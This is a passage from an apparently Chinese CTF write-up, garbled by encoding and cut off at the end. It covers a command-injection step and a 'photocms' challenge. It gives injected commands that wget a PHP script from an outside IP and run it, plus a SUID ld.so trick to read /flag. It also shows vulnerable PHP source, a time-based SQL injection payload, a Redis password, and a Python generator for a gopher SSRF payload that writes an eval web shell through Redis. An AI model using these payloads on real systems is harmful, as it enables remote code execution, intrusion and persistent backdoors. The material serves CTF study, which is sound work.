class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># curlå‘½ä»¤ä¸‹è½½phpè„šæœ¬åˆ° /tmp</span><br>/?filename=--cmd <span class="hljs-string">&quot;! wget http://30.222.0.114:8888/test.php -O /tmp/a123.php&quot;</span><br><span class="hljs-comment"># æ‰§è¡Œ</span><br>/?filename=--cmd <span class="hljs-string">&quot;! php /tmp/a123.php&quot;</span><br><span class="hljs-comment"># suidææƒï¼Œld-2.31.soæœ‰sæ ‡</span><br>/lib/x86_64-linux-gnu/ld-2.31.so /bin/cat /flag<br></code></pre></td></tr></table></figure><h1 id="photocms"><a href="#photocms" class="headerlink" title="photocms"></a>photocms</h1><p>hintè¯´å¼€äº†redisã€‚</p><p>photo.phpå¯ä»¥è¯»æ–‡ä»¶ï¼Œä¹Ÿå­˜åœ¨sqlæ³¨å…¥:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">clearall</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filepath</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$back</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;back = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">bak</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;back-&gt;<span class="hljs-title function_ invoke__">backup</span>(<span class="hljs-variable">$this</span>-&gt;filepath))&#123;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filepath);<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>        &#125;<br>    &#125;<br>  <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bak</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backup</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;/var/www/back/&quot;</span>.<span class="hljs-variable">$name</span>);<br>  &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;download_url&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;download_url&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>),<span class="hljs-string">&#x27;gopher&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>),<span class="hljs-string">&#x27;phar&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>),<span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br>  &#125;<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Transfer-Encoding: binary&#x27;</span> ); <br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Expires: 0&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Cache-Control: must-revalidate&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">ob_clean</span>(); <br>  <span class="hljs-title function_ invoke__">flush</span>(); <br>  <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&quot;/var/www/html/images/&quot;</span>.<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>));<br>  <span class="hljs-keyword">exit</span>; <br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$photo</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=photo&#x27;</span>, <span class="hljs-string">&#x27;photo&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO filelist (filedata) VALUES (&#x27;<span class="hljs-subst">$photo</span>&#x27;)&quot;</span>;<br>        <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;/var/www/html/images/1.jpg&quot;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$photo</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;upload OK&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pdoceshi&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$dbms</span>=<span class="hljs-string">&quot;mysql&quot;</span>;<br>  <span class="hljs-variable">$host</span>=<span class="hljs-string">&#x27;localhost&#x27;</span>;<br>  <span class="hljs-variable">$dbName</span>=<span class="hljs-string">&#x27;photo&#x27;</span>;<br>  <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;photo&#x27;</span>;<br>  <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;root&#x27;</span>;<br>  <span class="hljs-variable">$connectpdo</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pdo&#x27;</span>];<br>  <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-variable">$conne</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$connectpdo</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>);<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$conne</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PDO OK!&quot;</span>;<br>      &#125;<br>  &#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>      <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ å’Œunlinkï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ‰“pharï¼Œä½†æ˜¯æµ‹è¯•åå¥½åƒpharç»™banäº†ã€‚</p><p>index.phpæœ‰file_get_contentsï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;<br>&lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>&lt;meta name=<span class="hljs-string">&quot;keywords&quot;</span> content=<span class="hljs-string">&quot;Transact Solutions a Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template, </span><br><span class="hljs-string">Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design&quot;</span> /&gt;<br>&lt;link href=<span class="hljs-string">&quot;css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> media=<span class="hljs-string">&quot;all&quot;</span>&gt;<br>&lt;link href=<span class="hljs-string">&quot;css/font-awesome.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> media=<span class="hljs-string">&quot;all&quot;</span>&gt;<br>&lt;link href=<span class="hljs-string">&quot;css/style.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> media=<span class="hljs-string">&quot;all&quot;</span>/&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br> &lt;section <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">contact</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">contact</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">h3</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">xyz</span>&quot;&gt;<span class="hljs-title">base64</span>å›¾ç‰‡ç”Ÿæˆç³»ç»Ÿ&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">row</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">col</span>-<span class="hljs-title">lg</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">md</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">sm</span>-6 <span class="hljs-title">dghgffg</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">contactus9</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h3</span>&gt;<span class="hljs-title">base64</span>å›¾ç‰‡é¢„è§ˆ&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">data</span>:<span class="hljs-title">image</span>/<span class="hljs-title">png</span>;<span class="hljs-title">base64</span>,&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">file_get_contents</span>(&#x27;/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>/<span class="hljs-title">html</span>/<span class="hljs-title">images</span>/1.<span class="hljs-title">jpg</span>&#x27;));?&gt;&quot;/&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">contactus2</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h3</span>&gt;<span class="hljs-title">Download</span>&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">i</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">fa</span> <span class="hljs-title">fa</span>-<span class="hljs-title">flag</span>&quot; <span class="hljs-title">aria</span>-<span class="hljs-title">hidden</span>=&quot;<span class="hljs-title">true</span>&quot;&gt;&lt;/<span class="hljs-title">i</span>&gt; &lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;./<span class="hljs-title">photo</span>.<span class="hljs-title">php</span>?<span class="hljs-title">download_url</span>=<span class="hljs-title">MS5qcGc</span>=&quot;&gt;ç‚¹å‡»ä¸‹è½½&lt;/<span class="hljs-title">a</span>&gt;&lt;<span class="hljs-title">br</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">col</span>-<span class="hljs-title">lg</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">md</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">sm</span>-6 <span class="hljs-title">sdtrthjh</span>&quot;&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">form</span> <span class="hljs-title">action</span>=&quot;./<span class="hljs-title">photo</span>.<span class="hljs-title">php</span>&quot; <span class="hljs-title">method</span>=&quot;<span class="hljs-title">post</span>&quot;&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">contactus10</span>&quot;&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">h3</span>&gt;å›¾ç‰‡ç¼–ç &lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">                        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                            &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">name</span>&quot;&gt;</span><br><span class="hljs-class">                                <span class="hljs-title">base64</span>å›¾ç‰‡&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                            &lt;<span class="hljs-title">textarea</span> <span class="hljs-title">name</span>=&quot;<span class="hljs-title">photo</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">message</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">control</span>&quot; <span class="hljs-title">rows</span>=&quot;9&quot; <span class="hljs-title">cols</span>=&quot;25&quot; <span class="hljs-title">required</span>=&quot;<span class="hljs-title">required</span>&quot;</span><br><span class="hljs-class">                               &gt;&lt;/<span class="hljs-title">textarea</span>&gt;</span><br><span class="hljs-class">                        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">                        &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">btn</span> <span class="hljs-title">btn</span>-<span class="hljs-title">primary</span> <span class="hljs-title">pull</span>-<span class="hljs-title">right</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">btnContactUs</span>&quot;&gt;</span><br><span class="hljs-class">                          ç‚¹å‡»æäº¤&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">                           &lt;/<span class="hljs-title">form</span>&gt; </span><br><span class="hljs-class">  &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  </span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">section</span>&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">map</span>&quot;&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">jquery</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">jquery</span>.<span class="hljs-title">easing</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">move</span>-<span class="hljs-title">top</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">bootstrap</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">grayscale</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">SmoothScroll</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;!-- <span class="hljs-title">projects</span> --&gt;</span><br><span class="hljs-class">$(<span class="hljs-title">document</span>).<span class="hljs-title">ready</span>(<span class="hljs-title">function</span>()</span>&#123;<br>  $(<span class="hljs-string">&quot;[class^=&#x27;thumbnail-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">click</span>(function()&#123;<br>    $(<span class="hljs-string">&quot;[class^=&#x27;thumbnail-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">slideToggle</span>(<span class="hljs-string">&quot;fast&quot;</span>);<br>    $(this).<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-string">&quot;[class^=&#x27;large-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">slideToggle</span>();<br>  &#125;);<br>  <br>  $(<span class="hljs-string">&quot;.close&quot;</span>).<span class="hljs-title function_ invoke__">click</span>(function()&#123;<br>    $(<span class="hljs-string">&quot;[class^=&#x27;large-&#x27;]:visible&quot;</span>).<span class="hljs-title function_ invoke__">toggle</span>();<br>    $(<span class="hljs-string">&quot;[class^=&#x27;thumbnail-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">fadeToggle</span>(<span class="hljs-string">&quot;fast&quot;</span>);; <br>  &#125;); <br>  <br>&#125;);<br><br><span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">WOW</span>().<span class="hljs-title function_ invoke__">init</span>();<br>&lt;/script&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>$(document).<span class="hljs-title function_ invoke__">ready</span>(function() &#123;<br><span class="hljs-keyword">var</span> defaults = &#123;<br>containerID: <span class="hljs-string">&#x27;toTop&#x27;</span>, <span class="hljs-comment">// fading element id</span><br>containerHoverID: <span class="hljs-string">&#x27;toTopHover&#x27;</span>, <span class="hljs-comment">// fading element hover id</span><br>scrollSpeed: <span class="hljs-number">1200</span>,<br>easingType: <span class="hljs-string">&#x27;linear&#x27;</span> <br>&#125;;<br>$().<span class="hljs-title function_ invoke__">UItoTop</span>(&#123; <span class="hljs-attr">easingType</span>: <span class="hljs-string">&#x27;easeOutQuart&#x27;</span> &#125;);<br>&#125;);<br>&lt;/script&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ‰“sqlæ³¨å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">photo<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and (select sleep(3)));#</span><br></code></pre></td></tr></table></figure><p>redis :6379</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs redis">requirepass 79a1c5a9ad7370f0ff80ea96a10a481a<br></code></pre></td></tr></table></figure><p>SSRFï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span>  <span class="hljs-comment"># ä½¿ç”¨çš„åè®®</span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span>   <span class="hljs-comment"># ç›®æ ‡redisçš„ç«¯å£å·</span><br>shell=<span class="hljs-string">&quot;\n\n&lt;?php phpinfo();\n@eval($_POST[1]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;shell.php&quot;</span>   <span class="hljs-comment"># shellçš„åå­—</span><br>path=<span class="hljs-string">&quot;/var&quot;</span>      <span class="hljs-comment"># å†™å…¥çš„è·¯å¾„</span><br>passwd=<span class="hljs-string">&quot;79a1c5a9ad7370f0ff80ea96a10a481a&quot;</span>   <span class="hljs-comment"># å¦‚æœæœ‰å¯†ç  åˆ™å¡«å…¥</span><br><span class="hljs-comment"># æˆ‘ä»¬çš„æ¶æ„å‘½ä»¤</span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += urllib.quote(redis_format(x))<br>    <span class="hljs-built_in">print</span> payload<br>    <span class="hljs-built_in">print</span> urllib.quote(<span class="hljs-string">&quot;äºŒæ¬¡urlç¼–ç åçš„ç»“æœ:\n&quot;</span> + payload)<br></code></pre></td></tr></table></figure><p>é€šè¿‡dsnå¯ä»¥è§¦å‘wrapper 